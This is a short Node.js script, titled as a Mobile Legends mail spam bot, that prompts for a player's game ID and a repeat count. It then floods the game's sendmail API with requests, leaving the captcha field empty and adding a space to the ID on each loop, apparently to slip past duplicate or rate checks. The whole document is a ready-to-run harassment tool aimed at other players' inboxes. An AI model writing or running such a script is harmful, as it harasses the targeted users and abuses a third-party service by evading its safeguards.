const fetch = require('node-fetch');
const readlineSync = require('readline-sync');
const { URLSearchParams } = require('url');

console.log('\nBOT SPAM MAIL MOBILE LEGENDS\nANDHIKA DWI MAULANA\nSGBTEAM 2020\n');

var userid   = readlineSync.question("[+] ID ML : ");
const jmlh  = readlineSync.question("[+] Jumlah : ");
console.log("");


const funcspamcode = () => new Promise((resolve, reject) => {

    const params = new URLSearchParams();
    params.append('captcha', '');
    params.append('gameid', `${userid}`);
    params.append('language', 'en');

    fetch('https://mapi.mobilelegends.com/api/sendmail', { 
        method: 'POST',
        body: params
    })
        .then(res => res.json())
        .then(result => {
            resolve(result)
        })
});


(async () => {
    
    for (let index = 0; index < jmlh; index++) {
        const spam = await funcspamcode();
        console.log(spam);
        userid += " ";
    }
})();